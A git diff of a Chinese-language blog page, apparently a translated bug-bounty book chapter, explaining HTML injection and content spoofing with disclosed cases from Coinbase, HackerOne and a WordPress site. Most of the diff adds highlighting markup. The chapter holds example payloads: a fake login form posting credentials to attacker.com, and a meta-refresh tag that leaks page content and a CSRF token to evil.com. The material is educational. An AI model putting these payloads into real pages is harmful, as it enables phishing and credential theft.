@@ -440,10 +440,10 @@
 <p>当网站允许攻击者通常通过某些表单输入或URL参数提交HTML标签，然后直接将其显示在Web页上时，就会发生HTML注入漏洞。这类似于跨站点脚本攻击，不同之处在于这些注入允许执行恶意JavaScript。</p>
 <p>HTML注入有时称为虚拟污损（virtual defacement）。这是因为开发人员使用HTML语言来定义网页的结构。因此，如果攻击者可以注入HTML并由网站渲染它，则攻击者可以更改页面的外观。这种诱使用户通过伪造形式提交敏感信息的技术称为网络钓鱼。</p>
 <p>例如，如果页面呈现了您可以控制的内容，则可以向页面添加<code>&lt;form&gt;</code>标记，要求用户重新输入其用户名和密码，如下所示：</p>
-<pre class="line-numbers language-none"><code class="language-none">➊ &lt;form method='POST' action='http://attacker.com/capture.php' id='login-form'&gt;    &lt;input type='text' name='username' value=''&gt;    
-&lt;input type='password' name='password' value=''&gt;    
-&lt;input type='submit' value='submit'&gt;   
-&lt;/form&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html">➊ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>POST<span class="token punctuation">'</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>http://attacker.com/capture.php<span class="token punctuation">'</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>login-form<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>username<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>    
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>password<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>password<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>    
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>   
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>当用户提交此表单时，信息将通过<code>action</code>属性发送到攻击者的网站<code>http：// &lt;attacker&gt; .com / capture.php</code>。</p>
 <p>内容欺骗与HTML注入非常相似，只是攻击者只能注入纯文本，而不能注入HTML标签。 此限制通常是由服务器在发送HTTP响应时转义HTML标记引起的。 尽管攻击者无法使用内容欺骗来格式化网页，但他们可能能够插入看起来像合法网站内容的文本，例如消息。 这样的消息可以使目标愚弄目标去执行某项操作，但严重依赖于社会工程。 以下示例演示了如何探索这些漏洞。</p>
@@ -480,11 +480,11 @@
 1;&amp;#34;&amp;#108;&amp;#97;&amp;#115;&amp;#116;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#34;&amp;#62;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这样生成的html如下</p>
-<pre class="line-numbers language-none"><code class="language-none">Username:&lt;br&gt;
-&lt;input type="text" name="firstname"&gt;
-&lt;br&gt;
-Password:&lt;br&gt;
-&lt;input type="password" name="lastname"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html">Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
+Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这显示为文本输入形式，看起来像是输入用户名和密码登录名的地方。恶意黑客可能利用此漏洞诱使用户向可以捕获凭据的恶意网站提交实际表单。但是，此漏洞取决于用户是否被骗而认为登录是真实的并提交其信息，但这不能保证。因此，与不需要用户交互的漏洞相比，Coinbase的收益较低。</p>
 <p><strong>重点</strong></p>
@@ -503,19 +503,19 @@ Password:&lt;br&gt;
 <p> 2016年1月，Inti De Ceukelaire注意到HackerOne的Markdown编辑器配置错误，攻击者可以在Markdown语法中插入一个单引号，在HackerOne中所有使用Markdown编辑器的生成的HTML中都会被插入一个单引号。漏洞赏金计划管理页面以及报告都很容易受到攻击。如果攻击者能够在管理页面中找到第二个漏洞，并在页面开头的<code>&lt;meta&gt;</code>标记中插入第二个单引号，他们可以利用浏览器HTML解析来提取页面内容。原因是<code>&lt;meta&gt;</code>标签告诉浏览器通过标签的<code>content</code>属性中定义的URL刷新页面。显示页面时，浏览器将对<code>content</code>的URL执行GET请求。该页面中的内容可以作为GET请求的参数发送，攻击者可以使用该参数来提取目标的数据。这是带有注入的单引号的恶意<code>&lt;meta&gt;</code>标记：</p>
 <p><code>&lt;meta http-equiv =“refresh” content ='0; url = https://evil.com/log.php?text =</code></p>
 <p>0表示浏览器在对URL发出HTTP请求之前等待多长时间。在这种情况下，浏览器将立即向<code>https://evil.com/log.php?text=</code>发出HTTP请求。 HTTP请求将包括从content属性开始的单引号和攻击者使用网页上的Markdown解析器注入的单引号之间的所有内容。这是一个例子：</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;  
-&lt;head&gt;   
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>   
 &lt;meta http-equiv="refresh" content=➊'0; url=https://evil.com/log.php?text=  
-&lt;/head&gt;  
-&lt;body&gt;   
-&lt;h1&gt;Some content&lt;/h1&gt;   
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>   
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Some content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>   
 **--snip--**   
-&lt;input type="hidden" name="csrf-token" value= "ab34513cdfe123ad1f"&gt;  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>ab34513cdfe123ad1f<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  
 **--snip--**   
-&lt;p&gt;attacker input with '➋ &lt;/p&gt;  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>attacker input with '➋ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>  
 **--snip--**  
-&lt;/body&gt; 
-&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>页面内容从content属性之后的第一个单引号➊到➋的攻击者输入的单引号将作为URL文本参数的一部分发送给攻击者。还包括来自隐藏的跨站点请求伪造（CSRF）令牌。</p>
 <p>通常，对于HackerOne来说，HTML注入的风险不会成为问题，因为它使用React JavaScript框架来显示其HTML。 React是一个Facebook库，旨在动态更新网页内容而无需重新加载整个页面。使用React的另一个好处是，除非JavaScript功能危险地使用<code>SetInnerHTML</code>来直接更新DOM并显示HTML（DOM是HTML和XML文档的API，允许开发人员修改结构，样式，和网页内容（通过JavaScript））。事实证明，HackerOne危险地使用了<code>SetInnerHTML</code>，因为它信任从服务器接收的HTML。因此，它是将HTML直接注入DOM而不进行转义。</p>
@@ -547,7 +547,7 @@ Password:&lt;br&gt;
 <p>注意到此行为，黑客尝试修改error参数。结果，站点显示了传递给参数的值，作为向用户显示的错误消息的一部分，甚至对URI编码的字符进行了解码。这是黑客使用的修改后的URL：</p>
 <pre class="line-numbers language-none"><code class="language-none">https://withinsecurity.com/wp-login.php?error=Your%20account%20has%20been%20 hacked%2C%20Please%20call%20us%20this%20number%20919876543210%20OR%20Drop%20mail%20at%20attacker%40mail.com&amp;state=cb04a91ac5%257Chttps%253A%252F%252Fwithi nsecurity.com%252Fwp-admin%252F#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/part5-html-zhu-ru-he-nei-rong-tian-chong/injection.png"></p>
+<p><img src="/part5-html-zhu-ru-he-nei-rong-tian-chong/Part5-HTML%E6%B3%A8%E5%85%A5%E5%92%8C%E5%86%85%E5%AE%B9%E5%A1%AB%E5%85%85%5Cinjection.png"></p>
 <p><em>图5-1：攻击者能够将此“警告”注入WordPress管理页面</em></p>
 <p>在WordPress登录字段上显示的实际上是错误信息（error）的参数。该信息指示用户联系攻击者的电话号码和电子邮件。这里的关键是注意到URL中的参数在页面上显示。只需测试是否可以更改access_denied参数，就可以发现此漏洞。</p>
 <p><strong>重点</strong></p>
@@ -923,7 +923,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">38.9k</span>&nbsp;字
+                class="white-color">44.9k</span>&nbsp;字
             
             
             
